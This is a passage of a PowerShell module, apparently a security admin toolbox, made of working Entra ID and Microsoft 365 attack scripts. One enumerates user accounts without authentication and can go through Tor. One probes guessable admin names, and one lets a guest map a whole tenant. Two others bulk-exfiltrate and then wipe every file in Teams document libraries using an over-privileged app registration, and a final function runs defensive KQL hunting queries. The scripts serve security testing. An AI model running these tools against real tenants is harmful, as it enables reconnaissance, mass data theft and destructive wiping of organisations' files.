            This CMDlet will connect to public endpoints in Entra ID to find out if an account exists for specified email addresses or not. This script works without any authentication to Entra ID. This is called user enumeration in cyber security.
            
            The script can't see accounts for federated domains (since they are on-prem accounts) but it will tell you what organisation the federated domain belongs to.

            Do not use this script in an unethical or unlawful way. Use it to find weak spots in you Entra ID configuration.
        
        .PARAMETER Users
            An array of one or more user email addresses to test.

        .PARAMETER UseTorHttpProxy
            Use a running Tor network HTTP proxy that was started by Start-DCTorHttpProxy.
        
        .EXAMPLE
            Test-DCEntraIDUserExistence -UseTorHttpProxy -Users "user1@example.com", "user2@example.com", "user3@example.onmicrosoft.com"
        
        .INPUTS
            None

        .OUTPUTS
            None
        
        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
	#>


    param (
        [parameter(Mandatory = $true)]
        [array]$Users,

        [parameter(Mandatory = $false)]
        [switch]$UseTorHttpProxy
    )

    foreach ($User in $Users) {
        # Create custom object for output.
        $TestObject = New-Object -TypeName psobject

        # Add username.
        $TestObject | Add-Member -MemberType NoteProperty -Name "Username" -Value $User

        # Check if user account exists in Entra ID.
        $IfExistsResult = 1

        if ($UseTorHttpProxy) {
            $IfExistsResult = ((Invoke-WebRequest -Proxy "http://127.0.0.1:9150" -Method "POST" -Uri "https://login.microsoftonline.com/common/GetCredentialType" -Body "{`"Username`":`"$User`"}").Content | ConvertFrom-Json).IfExistsResult
        }
        else {
            $IfExistsResult = ((Invoke-WebRequest -Method "POST" -Uri "https://login.microsoftonline.com/common/GetCredentialType" -Body "{`"Username`":`"$User`"}").Content | ConvertFrom-Json).IfExistsResult
        }

        if ($IfExistsResult -eq 0) {   
            # Check domain federation status.
            [xml]$Response = ""

            if ($UseTorHttpProxy) {
                [xml]$Response = (Invoke-WebRequest -Proxy "http://127.0.0.1:9150" -Uri "https://login.microsoftonline.com/getuserrealm.srf?login=$User&xml=1").Content
            }
            else {
                [xml]$Response = (Invoke-WebRequest -Uri "https://login.microsoftonline.com/getuserrealm.srf?login=$User&xml=1").Content
            }

            # Add org information.
            $TestObject | Add-Member -MemberType NoteProperty -Name "Org" -Value $Response.RealmInfo.FederationBrandName
			
            # If domain is Federated we can't tell if the account exists or not :(
            if ($Response.RealmInfo.IsFederatedNS -eq $true) {
                $TestObject | Add-Member -MemberType NoteProperty -Name "UserExists" -Value "Unknown (federated domain: $((($Response.RealmInfo.AuthURL -split "//")[1] -split "/")[0]))"
            }
            # If the domain is Managed (not federated) we can tell if an account exists in Entra ID :)
            else {
                $TestObject | Add-Member -MemberType NoteProperty -Name "UserExists" -Value "Yes"
            }
        }
        else {
            $TestObject | Add-Member -MemberType NoteProperty -Name "UserExists" -Value "No"
        }

        $TestObject
    }   
}



function Test-DCEntraIDCommonAdmins {
    <#
        .SYNOPSIS
            Test if common and easily guessed admin usernames exist for specified Entra ID domains.
        
        .DESCRIPTION
            Uses Test-DCEntraIDUserExistence to test if common and weak admin account names exist in specified Entra ID domains. It uses publicaly available Microsoft endpoints to query for this information. Run help Test-DCEntraIDUserExistence for more info.

            Do not use this script in an unethical or unlawful way. Use it to find weak spots in you Entra ID configuration.
        
        .PARAMETER Domains
            An array of one or more domains to test.

        .PARAMETER UseTorHttpProxy
            Use a running Tor network HTTP proxy that was started by Start-DCTorHttpProxy.
        
        .EXAMPLE
            Test-DCEntraIDCommonAdmins -UseTorHttpProxy -Domains "example.com", "example2.onmicrosoft.com"
        
        .INPUTS
            None

        .OUTPUTS
            None
        
        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
	#>

	
    param (
        [parameter(Mandatory = $true)]
        [array]$Domains,
		
        [parameter(Mandatory = $false)]
        [switch]$UseTorHttpProxy
    )

    $CommonAdminUsernames = "admin@DOMAINNAME",
    "administrator@DOMAINNAME",
    "root@DOMAINNAME",
    "system@DOMAINNAME",
    "operator@DOMAINNAME",
    "super@DOMAINNAME",
    "breakglass@DOMAINNAME",
    "breakglass1@DOMAINNAME",
    "breakglass2@DOMAINNAME",
    "serviceaccount@DOMAINNAME",
    "service@DOMAINNAME",
    "srv@DOMAINNAME",
    "svc@DOMAINNAME",
    "smtp@DOMAINNAME",
    "smtprelay@DOMAINNAME",
    "mail@DOMAINNAME",
    "exchange@DOMAINNAME",
    "sharepoint@DOMAINNAME",
    "teams@DOMAINNAME",
    "azure@DOMAINNAME",
    "user@DOMAINNAME",
    "user1@DOMAINNAME",
    "user01@DOMAINNAME",
    "guest@DOMAINNAME",
    "test@DOMAINNAME",
    "test1@DOMAINNAME",
    "test01@DOMAINNAME",
    "testing@DOMAINNAME",
    "test.test@DOMAINNAME",
    "test.testsson@DOMAINNAME",
    "demo@DOMAINNAME",
    "backup@DOMAINNAME",
    "print@DOMAINNAME",
    "sa@DOMAINNAME",
    "sql@DOMAINNAME",
    "mysql@DOMAINNAME",
    "oracle@DOMAINNAME"

    foreach ($Domain in $Domains) {
        if ($UseTorHttpProxy) {
            Test-DCEntraIDUserExistence -UseTorHttpProxy -Users ($CommonAdminUsernames -replace "DOMAINNAME", $Domain)
        }
        else {
            Test-DCEntraIDUserExistence -Users ($CommonAdminUsernames -replace "DOMAINNAME", $Domain)
        }
    }   
}



function Get-DCEntraIDUsersAndGroupsAsGuest {
    <#
        .SYNOPSIS
            This script lets a guest user enumerate users and security groups/teams when 'Guest user access restrictions' in Entra ID is set to the default configuration.
        
        .DESCRIPTION
            This script is a proof of concept. Don't use it for bad things! It lets a guest user enumerate users and security groups/teams when 'Guest user access restrictions' in Entra ID is set to the default configuration. It works around the limitation that guest users must do explicit lookups for users and groups. It basically produces a list of all users and groups in the tenant, even though such actions are blocked for guests by default.
            
            If the target tenant allows guest users to sign in with Entra ID PowerShell, and the 'Guest user access restrictions' is set to one of these two settings:
            'Guest users have the same access as members (most inclusive)'
            'Guest users have limited access to properties and memberships of directory objects' [default]

            And not set to:
            'Guest user access is restricted to properties and memberships of their own directory objects (most restrictive)'

            ...then this script will query Entra ID for the group memberships of the specified -InterestingUsers that you already know the UPN of. It then perform nested queries until all users and groups have been found. It will stop after a maximum of 5 iterations to avoid throttling and infinite loops. "A friend of a friend of a friend..."

            Finally, the script will output one array with found users, and one array with found groups/teams. You can then export them to CSV or some other format of your choice. Export examples are outputed for your convenience.
        
        .PARAMETER TenantId
            The tenant ID of the target tenant where you are a guest. You can find all your guest tenant IDs here: https://portal.azure.com/#settings/directory

        .PARAMETER AccountId
            Your UPN in your home tenant (probably your email address, right?).

        .PARAMETER InterestingUsers
            One or more UPNs of users in the target tenant. These will serve as a starting point for the search, and one or two employees you know about is often sufficient to enumerate everything.
        
        .EXAMPLE
            Get-DCEntraIDUsersAndGroupsAsGuest -TenantId '00000000-0000-0000-0000-000000000000' -AccountId 'user@example.com' -InterestingUsers 'customer1@customer.com', 'customer2@customer.com'

        .INPUTS
            None

        .OUTPUTS
            One array with found users, and one array with found groups/teams.
        
        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
	#>


    param (
        [parameter(Mandatory = $true)]
        [string]$TenantId,

        [parameter(Mandatory = $true)]
        [string]$AccountId,

        [parameter(Mandatory = $true)]
        [string[]]$InterestingUsers
    )


    # Connect to the target tenant as a guest.
    Write-Verbose -Verbose -Message 'Connecting to Entra ID as guest...'
    Connect-AzureAd -TenantId $TenantId -AccountId $AccountId | Out-Null


    # Variables to collect.
    $global:FoundUsers = @()
    $global:FoundGroups = @()


    # First round.
    Write-Verbose -Verbose -Message 'Starting round 1...'
    $global:FoundUsers = foreach ($User in $InterestingUsers) {
        $FormatedUser = Get-AzureAdUser -ObjectId $User
        $Manager = Get-AzureAdUserManager -ObjectId $FormatedUser.ObjectId
        $FormatedUser | Add-Member -NotePropertyName 'ManagerDisplayName' -NotePropertyValue $Manager.DisplayName -Force
        $FormatedUser | Add-Member -NotePropertyName 'ManagerUpn' -NotePropertyValue $Manager.UserPrincipalName -Force
        $FormatedUser | Add-Member -NotePropertyName 'ManagerObjectId' -NotePropertyValue $Manager.ObjectId -Force
        $FormatedUser
    }

    $global:FoundUsers = @($global:FoundUsers | Select-Object -Unique | Sort-Object UserPrincipalName)
    Write-Verbose -Verbose -Message "Found $($global:FoundUsers.Count) users!"


    # Remaining rounds.
    for ($i = 2; $i -le 5; $i++) {
        Write-Verbose -Verbose -Message "Starting round $i..."

        foreach ($User in $global:FoundUsers) {
            $Groups = Get-AzureAdUserMembership -ObjectID $User.UserPrincipalName | Where-Object DisplayName -NE $null

            foreach ($Group in $Groups) {
                if ($global:FoundGroups.ObjectId) {
                    if (!($global:FoundGroups.ObjectId.Contains($Group.ObjectId))) {
                        Write-Verbose -Verbose -Message "Processing group '$($Group.DisplayName)'..."

                        $global:FoundGroups += $Group

                        $Members = @()

                        try {
                            $Members = Get-AzureAdGroupMember -All:$true -ObjectId $Group.ObjectId -ErrorAction SilentlyContinue
                        }
                        catch {
                            # Do nothing.
                        }

                        foreach ($Member in $Members) {
                            if (!($global:FoundUsers.ObjectId.Contains($Member.ObjectId))) {
                                $FormatedUser = Get-AzureAdUser -ObjectId $Member.ObjectId -ErrorAction SilentlyContinue
                                $Manager = Get-AzureAdUserManager -ObjectId $FormatedUser.ObjectId
                                $FormatedUser | Add-Member -NotePropertyName 'ManagerDisplayName' -NotePropertyValue $Manager.DisplayName -Force
                                $FormatedUser | Add-Member -NotePropertyName 'ManagerUpn' -NotePropertyValue $Manager.UserPrincipalName -Force
                                $FormatedUser | Add-Member -NotePropertyName 'ManagerObjectId' -NotePropertyValue $Manager.ObjectId -Force
                                $global:FoundUsers += $FormatedUser
                            }
                        }
                    }
                }
                else {
                    Write-Verbose -Verbose -Message "Processing group '$($Group.DisplayName)'..."
                    
                    $global:FoundGroups += $Group

                    $Members = @()

                    try {
                        $Members = Get-AzureAdGroupMember -All:$true -ObjectId $Group.ObjectId -ErrorAction SilentlyContinue
                    }
                    catch {
                        # Do nothing.
                    }

                    foreach ($Member in $Members) {
                        if (!($global:FoundUsers.ObjectId.Contains($Member.ObjectId))) {
                            $FormatedUser = Get-AzureAdUser -ObjectId $Member.ObjectId -ErrorAction SilentlyContinue
                            $Manager = Get-AzureAdUserManager -ObjectId $FormatedUser.ObjectId
                            $FormatedUser | Add-Member -NotePropertyName 'ManagerDisplayName' -NotePropertyValue $Manager.DisplayName -Force
                            $FormatedUser | Add-Member -NotePropertyName 'ManagerUpn' -NotePropertyValue $Manager.UserPrincipalName -Force
                            $FormatedUser | Add-Member -NotePropertyName 'ManagerObjectId' -NotePropertyValue $Manager.ObjectId -Force
                            $global:FoundUsers += $FormatedUser
                        }
                    }
                }
            }
        }

        # Remove duplicates.
        $global:FoundUsers = $global:FoundUsers | Select-Object -Unique | Sort-Object UserPrincipalName
        Write-Verbose -Verbose -Message "Found $($global:FoundUsers.Count) users!"
        $global:FoundGroups = $global:FoundGroups | Select-Object -Unique | Sort-Object DisplayName
        Write-Verbose -Verbose -Message "Found $($global:FoundGroups.Count) groups!"

        # Check if we found any new users or groups this round.
        if ($global:FoundUsers.Count -eq $LastRoundUsers -and $global:FoundGroups.Count -eq $LastRoundGroups) {
            Write-Verbose -Verbose -Message "No new users or groups found in this round! Breaking loop!"
            break
        }

        # Use this to check for new users and groups next round.
        $LastRoundUsers = $global:FoundUsers.Count
        $LastRoundGroups = $global:FoundGroups.Count
    }

    
    # Output instructions.
    Write-Host ''
    Write-Verbose -Verbose -Message "You now have two arrays with found users and groups:"
    Write-Host -ForegroundColor 'Green' '$FoundUsers | Format-Table ObjectId, UserPrincipalName, DisplayName, ManagerUpn, ManagerDisplayName'
    Write-Host -ForegroundColor 'Green' '$FoundGroups | Format-Table ObjectId, DisplayName, Description, SecurityEnabled'
    Write-Host ''
    Write-Verbose -Verbose -Message "You can export them to CSV like this:"
    Write-Host -ForegroundColor 'Green' "`$FoundUsers | Export-Csv -NoTypeInformation -Delimiter ';' -Encoding UTF8 -Path 'FoundUsers.csv'"
    Write-Host -ForegroundColor 'Green' "`$FoundGroups | Export-Csv -NoTypeInformation -Delimiter ';' -Encoding UTF8 -Path 'FoundGroups.csv'"
    Write-Host ''
}



function Invoke-DCM365DataExfiltration {
    <#
        .SYNOPSIS
            This script uses an Entra ID app registration to download all files from all M365 groups (Teams) document libraries in a tenant.
        
        .DESCRIPTION
            This script is a proof of concept and for testing purposes only. Do not use this script in an unethical or unlawful way. Don’t be stupid!
            
            This script showcase how an attacker can exfiltrate huge amounts of files from a Microsoft 365 tenant, using a poorly protected Entra ID app registration with any of the following Microsoft Graph permissions:

            - Files.Read.All
            - Files.ReadWrite.All
            - Sites.Read.All
            - Sites.ReadWrite.All

            Also, one of the following permissions is required to enumerate M365 groups and SharePoint document libraries:

            - GroupMember.Read.All
            - Group.Read.All
            - Directory.Read.All
            - Group.ReadWrite.All
            - Directory.ReadWrite.All
        
            The script will loop through all M365 groups and their SharePoint Online document libraries (used by Microsoft Teams for storing files) and download all files it can find, down to three folder levels. The files will be downloaded to the current directory.
            
            A list of downloaded files will be copied to the clipboard after completion.

            You can run the script with -WhatIf to skip the actual downloads. It will still show the output and what would have been downloaded.
        
        .PARAMETER ClientID
            Client ID for your Entra ID application.

        .PARAMETER ClientSecret
            Client secret for the Entra ID application.

        .PARAMETER TenantName
            The name of your tenant (example.onmicrosoft.com).
        
        .PARAMETER WhatIf
            Skip the actual downloads. It will still show the output and what would have been downloaded.
        
        .EXAMPLE
            Invoke-M365DataExfiltration -ClientID '8a85d2cf-17c7-4ecd-a4ef-05b9a81a9bba' -ClientSecret 'j[BQNSi29Wj4od92ritl_DHJvl1sG.Y/' -TenantName 'example.onmicrosoft.com'

        .EXAMPLE
            Invoke-M365DataExfiltration -ClientID '8a85d2cf-17c7-4ecd-a4ef-05b9a81a9bba' -ClientSecret 'j[BQNSi29Wj4od92ritl_DHJvl1sG.Y/' -TenantName 'example.onmicrosoft.com' -WhatIf

        .INPUTS
            None

        .OUTPUTS
            None
        
        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
	#>


    param (
        [parameter(Mandatory = $true)]
        [string]$ClientID,

        [parameter(Mandatory = $true)]
        [string]$ClientSecret,

        [parameter(Mandatory = $true)]
        [string]$TenantName,

        [parameter(Mandatory = $false)]
        [switch]$WhatIf
    )


    # WhatIf.
    if ($WhatIf) {
        Write-Verbose -Verbose -Message "NOTE: -WhatIf was declared. Simulating run (no files will be downloaded)!"
    }


    # Connect to Microsoft Graph with application credentials.
    Write-Verbose -Verbose -Message "Connecting to Microsoft Graph as Service Principal '$ClientID'..."
    $Parameters = @{
        ClientID = $ClientID
        ClientSecret = $ClientSecret
        TenantName = $TenantName
    }

    $AccessToken = Connect-DCMsGraphAsApplication @Parameters


    # GET all Microsoft 365 Groups.
    Write-Verbose -Verbose -Message "Fetching all Microsoft 365 groups (Teams)..."
    $Parameters = @{
        AccessToken = $AccessToken
        GraphMethod = 'GET'
        GraphUri = "https://graph.microsoft.com/v1.0/groups?`$filter=groupTypes/any(c:c+eq+'Unified')&`$select=id,displayName,description"
    }

    $M365Groups = Invoke-DCMsGraphQuery @Parameters
    Write-Verbose -Verbose -Message "Found $($M365Groups.Count) Microsoft 365 groups."


    # GET all related SharePoint document libraries.
    Write-Verbose -Verbose -Message "Loading related SharePoint document libraries..."
    $DocumentLibraries = foreach ($Group in $M365Groups) {
        $Parameters = @{
            AccessToken = $AccessToken
            GraphMethod = 'GET'
            GraphUri = "https://graph.microsoft.com/v1.0/groups/$($Group.id)/drive?`$select=id,name,webUrl"
        }

        Invoke-DCMsGraphQuery @Parameters
    }
    Write-Verbose -Verbose -Message "Done! Starting download job NOW..."


    # DOWNLOAD files in the document libraries (root level + three folder levels down).
    $Files = foreach ($DocumentLibrary in $DocumentLibraries) {
        Write-Verbose -Verbose -Message "--- Looking in '$($DocumentLibrary.webUrl)'..."

        $Parameters = @{
            AccessToken = $AccessToken
            GraphMethod = 'GET'
            GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/root/children"
        }

        $RootContent = Invoke-DCMsGraphQuery @Parameters
        $RootContent | where file

        # Download files in root directory.
        foreach ($File in ($RootContent | where file)) {
            Write-Verbose -Verbose -Message "------ Downloading '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

            $HeaderParams = @{
                'Content-Type'  = "application\json"
                'Authorization' = "Bearer $AccessToken"
            }

            if (!($WhatIf)) {
                Invoke-RestMethod -Headers $HeaderParams -Uri $File."@microsoft.graph.downloadUrl" -UseBasicParsing -Method GET -ContentType "application/json" -OutFile $File.Name
            }
        }

        foreach ($Item in ($RootContent | where folder)) {
            $Parameters = @{
                AccessToken = $AccessToken
                GraphMethod = 'GET'
                GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
            }

            $SubContentLevel1 = Invoke-DCMsGraphQuery @Parameters
            $SubContentLevel1 | where file
            
            # Download files in sub SubContentLevel1.
            foreach ($File in ($SubContentLevel1 | where file)) {
                Write-Verbose -Verbose -Message "------ Downloading '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

                $HeaderParams = @{
                    'Content-Type'  = "application\json"
                    'Authorization' = "Bearer $AccessToken"
                }

                if (!($WhatIf)) {
                    Invoke-RestMethod -Headers $HeaderParams -Uri $File."@microsoft.graph.downloadUrl" -UseBasicParsing -Method GET -ContentType "application/json" -OutFile $File.Name
                }
            }

            # Go through folders in SubContentLevel1.
            foreach ($Item in ($SubContentLevel1 | where folder)) {
                $Parameters = @{
                    AccessToken = $AccessToken
                    GraphMethod = 'GET'
                    GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
                }
        
                $SubContentLevel2 = Invoke-DCMsGraphQuery @Parameters
                $SubContentLevel2 | where file
                
                # Download files in sub SubContentLevel2.
                foreach ($File in ($SubContentLevel2 | where file)) {
                    Write-Verbose -Verbose -Message "------ Downloading '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

                    $HeaderParams = @{
                        'Content-Type'  = "application\json"
                        'Authorization' = "Bearer $AccessToken"
                    }

                    if (!($WhatIf)) {
                        Invoke-RestMethod -Headers $HeaderParams -Uri $File."@microsoft.graph.downloadUrl" -UseBasicParsing -Method GET -ContentType "application/json" -OutFile $File.Name
                    }
                }

                # Go through folders in SubContentLevel2.
                foreach ($Item in ($SubContentLevel2 | where folder)) {
                    $Parameters = @{
                        AccessToken = $AccessToken
                        GraphMethod = 'GET'
                        GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
                    }
            
                    $SubContentLevel3 = Invoke-DCMsGraphQuery @Parameters
                    $SubContentLevel3 | where file
                    
                    # Download files in sub SubContentLevel3.
                    foreach ($File in ($SubContentLevel3 | where file)) {
                        Write-Verbose -Verbose -Message "------ Downloading '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

                        $HeaderParams = @{
                            'Content-Type'  = "application\json"
                            'Authorization' = "Bearer $AccessToken"
                        }

                        if (!($WhatIf)) {
                            Invoke-RestMethod -Headers $HeaderParams -Uri $File."@microsoft.graph.downloadUrl" -UseBasicParsing -Method GET -ContentType "application/json" -OutFile $File.Name
                        }
                    }
                }
            }
        }
    }


    # Copy result to clipboard and exit.
    $Files | Select-Object Name,size | Set-Clipboard
    Write-Verbose -Verbose -Message "File list copied to clipboard!"
    Write-Verbose -Verbose -Message "All done!"
}



function Invoke-DCM365DataWiper {
    <#
        .SYNOPSIS
            This script uses an Entra ID app registration to wipe all files from all M365 groups (Teams) document libraries in a tenant.
        
        .DESCRIPTION
            This script is a proof of concept and for testing purposes only. Do not use this script in an unethical or unlawful way. Don’t be stupid!
            
            This script showcase how an attacker can wipe huge amounts of files from a Microsoft 365 tenant, using a poorly protected Entra ID app registration with any of the following Microsoft Graph permissions:

            - Files.ReadWrite.All
            - Sites.ReadWrite.All

            Also, one of the following permissions is required to enumerate M365 groups and SharePoint document libraries:

            - GroupMember.Read.All
            - Group.Read.All
            - Directory.Read.All
            - Group.ReadWrite.All
            - Directory.ReadWrite.All
        
            The script will loop through all M365 groups and their SharePoint Online document libraries (used by Microsoft Teams for storing files) and delete all files it can find, down to three folder levels. The files will be downloaded to the current directory.
            
            A list of downloaded files will be copied to the clipboard after completion.

            You can run the script with -WhatIf to skip the actual deletion. It will still show the output and what would have been deleted.
        
        .PARAMETER ClientID
            Client ID for your Entra ID application.

        .PARAMETER ClientSecret
            Client secret for the Entra ID application.

        .PARAMETER TenantName
            The name of your tenant (example.onmicrosoft.com).
        
        .PARAMETER WhatIf
            Skip the actual deletion. It will still show the output and what would have been deleted.
        
        .EXAMPLE
            Invoke-DCM365DataWiper -ClientID '8a85d2cf-17c7-4ecd-a4ef-05b9a81a9bba' -ClientSecret 'j[BQNSi29Wj4od92ritl_DHJvl1sG.Y/' -TenantName 'example.onmicrosoft.com'

        .EXAMPLE
            Invoke-DCM365DataWiper -ClientID '8a85d2cf-17c7-4ecd-a4ef-05b9a81a9bba' -ClientSecret 'j[BQNSi29Wj4od92ritl_DHJvl1sG.Y/' -TenantName 'example.onmicrosoft.com' -WhatIf

        .INPUTS
            None

        .OUTPUTS
            None
        
        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
	#>


    param (
        [parameter(Mandatory = $true)]
        [string]$ClientID,

        [parameter(Mandatory = $true)]
        [string]$ClientSecret,

        [parameter(Mandatory = $true)]
        [string]$TenantName,

        [parameter(Mandatory = $false)]
        [switch]$WhatIf
    )


    # WhatIf.
    if ($WhatIf) {
        Write-Verbose -Verbose -Message "NOTE: -WhatIf was declared. Simulating run (no files will be deleted)!"
    }


    # Connect to Microsoft Graph with application credentials.
    Write-Verbose -Verbose -Message "Connecting to Microsoft Graph as Service Principal '$ClientID'..."
    $Parameters = @{
        ClientID = $ClientID
        ClientSecret = $ClientSecret
        TenantName = $TenantName
    }

    $AccessToken = Connect-DCMsGraphAsApplication @Parameters


    # GET all Microsoft 365 Groups.
    Write-Verbose -Verbose -Message "Fetching all Microsoft 365 groups (Teams)..."
    $Parameters = @{
        AccessToken = $AccessToken
        GraphMethod = 'GET'
        GraphUri = "https://graph.microsoft.com/v1.0/groups?`$filter=groupTypes/any(c:c+eq+'Unified')&`$select=id,displayName,description"
    }

    $M365Groups = Invoke-DCMsGraphQuery @Parameters
    Write-Verbose -Verbose -Message "Found $($M365Groups.Count) Microsoft 365 groups."


    # GET all related SharePoint document libraries.
    Write-Verbose -Verbose -Message "Loading related SharePoint document libraries..."
    $DocumentLibraries = foreach ($Group in $M365Groups) {
        $Parameters = @{
            AccessToken = $AccessToken
            GraphMethod = 'GET'
            GraphUri = "https://graph.microsoft.com/v1.0/groups/$($Group.id)/drive?`$select=id,name,webUrl"
        }

        Invoke-DCMsGraphQuery @Parameters
    }
    Write-Verbose -Verbose -Message "Done! Starting wipe job NOW..."


    # DELETE files in the document libraries (root level + three folder levels down).
    $Files = foreach ($DocumentLibrary in $DocumentLibraries) {
        Write-Verbose -Verbose -Message "--- Looking in '$($DocumentLibrary.webUrl)'..."

        $Parameters = @{
            AccessToken = $AccessToken
            GraphMethod = 'GET'
            GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/root/children"
        }

        $RootContent = Invoke-DCMsGraphQuery @Parameters
        $RootContent | where file

        # Delete files in root directory.
        foreach ($File in ($RootContent | where file)) {
            Write-Verbose -Verbose -Message "------ Deleting '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

            $Parameters = @{
                AccessToken = $AccessToken
                GraphMethod = 'DELETE'
                GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($File.id)"
            }
    
            if (!($WhatIf)) {
                $RootContent = Invoke-DCMsGraphQuery @Parameters
            }
        }

        foreach ($Item in ($RootContent | where folder)) {
            $Parameters = @{
                AccessToken = $AccessToken
                GraphMethod = 'GET'
                GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
            }

            $SubContentLevel1 = Invoke-DCMsGraphQuery @Parameters
            $SubContentLevel1 | where file
            
            # Delete files in sub SubContentLevel1.
            foreach ($File in ($SubContentLevel1 | where file)) {
                Write-Verbose -Verbose -Message "------ Deleting '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

                $Parameters = @{
                    AccessToken = $AccessToken
                    GraphMethod = 'DELETE'
                    GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($File.id)"
                }
        
                if (!($WhatIf)) {
                    $RootContent = Invoke-DCMsGraphQuery @Parameters
                }
            }

            # Go through folders in SubContentLevel1.
            foreach ($Item in ($SubContentLevel1 | where folder)) {
                $Parameters = @{
                    AccessToken = $AccessToken
                    GraphMethod = 'GET'
                    GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
                }
        
                $SubContentLevel2 = Invoke-DCMsGraphQuery @Parameters
                $SubContentLevel2 | where file
                
                # Delete files in sub SubContentLevel2.
                foreach ($File in ($SubContentLevel2 | where file)) {
                    Write-Verbose -Verbose -Message "------ Deleting '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

                    $Parameters = @{
                        AccessToken = $AccessToken
                        GraphMethod = 'DELETE'
                        GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($File.id)"
                    }
            
                    if (!($WhatIf)) {
                        $RootContent = Invoke-DCMsGraphQuery @Parameters
                    }
                }

                # Go through folders in SubContentLevel2.
                foreach ($Item in ($SubContentLevel2 | where folder)) {
                    $Parameters = @{
                        AccessToken = $AccessToken
                        GraphMethod = 'GET'
                        GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
                    }
            
                    $SubContentLevel3 = Invoke-DCMsGraphQuery @Parameters
                    $SubContentLevel3 | where file
                    
                    # Delete files in sub SubContentLevel3.
                    foreach ($File in ($SubContentLevel3 | where file)) {
                        Write-Verbose -Verbose -Message "------ Deleting '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

                        $Parameters = @{
                            AccessToken = $AccessToken
                            GraphMethod = 'DELETE'
                            GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($File.id)"
                        }
                
                        if (!($WhatIf)) {
                            $RootContent = Invoke-DCMsGraphQuery @Parameters
                        }
                    }
                }
            }
        }
    }


    # Copy result to clipboard and exit.
    $Files | Select-Object Name,size | Set-Clipboard
    Write-Verbose -Verbose -Message "File list copied to clipboard!"
    Write-Verbose -Verbose -Message "All done!"
}



function Invoke-DCHuntingQuery {
    <#
        .SYNOPSIS
            Connect to Microsoft Graph with the Microsoft Graph PowerShell module and run a KQL hunting query in Microsoft Defender XDR.

        .DESCRIPTION
            Connect to Microsoft Graph with the Microsoft Graph PowerShell module and run a KQL hunting query in Microsoft Defender XDR.

        .PARAMETER Query
            The KQL query you want to run in Microsoft Defender XDR.

        .PARAMETER IncludeQueryAtTop
            Include the KQL query before the actual result output.

        .PARAMETER IncludeRaw
            Include the raw formated and escaped KQL query sent to Microsoft Graph.

        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            $Query = @'
            DeviceEvents
            | where ActionType startswith "Asr"
            | summarize count() by ActionType
            | order by count_
            '@

            Invoke-DCHuntingQuery -Query $Query

        .EXAMPLE
            $Query = @'
            DeviceEvents
            | where ActionType startswith "Asr"
            | summarize count() by ActionType
            | order by count_
            '@

            Invoke-DCHuntingQuery -Query $Query -IncludeKQLQueryAtTop
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    [CmdletBinding()]
    param (
        [parameter(Mandatory = $true)]
        [string]$Query,

        [parameter(Mandatory = $false)]
        [switch]$IncludeKQLQueryAtTop,

        [parameter(Mandatory = $false)]
        [switch]$IncludeRaw
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'ThreatHunting.Read.All'


    if ($IncludeKQLQueryAtTop) {
        Write-Host ''
        Write-Host -ForegroundColor Cyan $Query
        Write-Host ''
    }


    # Run KQL hunting query.
    $Query = $Query -replace "\\", '\\' -replace '"', '\"'

    $GraphBody = @"
{
    "Query": "$Query"
}
"@

    if ($IncludeRaw) {
        Write-Host ''
        Write-Host -ForegroundColor Magenta $Query
        Write-Host ''
    }

    $Results = Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/v1.0/security/runHuntingQuery' -Body $GraphBody -OutputType Json

    $Results = ($Results | ConvertFrom-Json).results

    $Properties = @(($Results | Select-Object -First 1).PSObject.Properties | Where-Object { $_.Name -notlike "*@odata.type"}).Name

    $CountIsPresent = $false

    [string[]]$Properties = foreach ($Property in $Properties) {
        if ($Property -eq 'count_') {
            $CountIsPresent = $true
        } else {
            $Property
        }
    }

    if ($CountIsPresent) {
        $Properties += "count_"
    }

    $Results | Select-Object -Property $Properties

    if (!($Results)) {
        Write-host '-- empty result --'
        Write-host ''
    }
